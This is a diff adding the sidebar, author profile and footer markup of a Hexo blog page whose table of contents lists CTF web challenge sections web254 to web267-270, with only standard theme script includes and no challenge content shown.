+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#web254"><span class="nav-number">1.</span> <span class="nav-text">web254</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web255"><span class="nav-number">2.</span> <span class="nav-text">web255</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web256"><span class="nav-number">3.</span> <span class="nav-text">web256</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web257"><span class="nav-number">4.</span> <span class="nav-text">web257</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web258"><span class="nav-number">5.</span> <span class="nav-text">web258</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web259"><span class="nav-number">6.</span> <span class="nav-text">web259</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web260"><span class="nav-number">7.</span> <span class="nav-text">web260</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web261"><span class="nav-number">8.</span> <span class="nav-text">web261</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web262"><span class="nav-number">9.</span> <span class="nav-text">web262</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web263"><span class="nav-number">10.</span> <span class="nav-text">web263</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web264"><span class="nav-number">11.</span> <span class="nav-text">web264</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web265"><span class="nav-number">12.</span> <span class="nav-text">web265</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web266"><span class="nav-number">13.</span> <span class="nav-text">web266</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web267-270"><span class="nav-number">14.</span> <span class="nav-text">web267-270</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Peguin"
+      src="/images/1.jpg">
+  <p class="site-author-name" itemprop="name">Peguin</p>
+  <div class="site-description" itemprop="description">敢于去想，才会有MEteor的光芒闪耀。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">83</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">42</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/ambitiousleader/" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;ambitiousleader&#x2F;" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/601209387@qq.com" title="E-Mail → 601209387@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://weibo.com/u/6772435317/home?wvr=5&sudaref=graph.qq.com" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;u&#x2F;6772435317&#x2F;home?wvr&#x3D;5&amp;sudaref&#x3D;graph.qq.com" rel="noopener" target="_blank"><i class="fab fa-weibo fa-fw"></i>Weibo</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Peguin</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,0' opacity='0.5' zIndex='-1' count='150' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+  
+   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+   <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+   <script type="text/javascript" src="/js/fireworks.js"></script>
+  
+
+
+</body>
+</html>
